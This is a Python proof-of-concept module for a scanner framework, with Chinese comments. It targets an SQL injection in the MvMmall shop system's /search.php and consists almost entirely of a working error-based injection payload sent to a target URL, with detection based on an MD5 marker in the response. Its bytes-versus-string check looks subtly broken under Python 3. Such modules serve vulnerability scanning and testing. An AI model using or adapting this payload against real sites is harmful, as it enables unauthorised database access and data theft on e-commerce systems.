# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MvMmall_0101'  # 平台漏洞编号，留空
    name = 'MvMmall 网店商城系统 /search.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-09'  # 漏洞公布时间
    desc = '''
        MvMmall网店商城系统最新注入0day问题出在搜索search.php这个文件上。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=1732'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MvMmall'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '06fbdf4c-813f-4db3-bfe3-ee7d086587d0'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from"
                       "(select%20count(*),concat((select%20(select%20md5(12345))%20"
                       "from%20information_schema.tables%20limit%200,1),floor(rand(0)"
                       "*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20"
                       "and%201=1%23")
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '827ccb0eea8a706c4c34a16891f84e7b' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
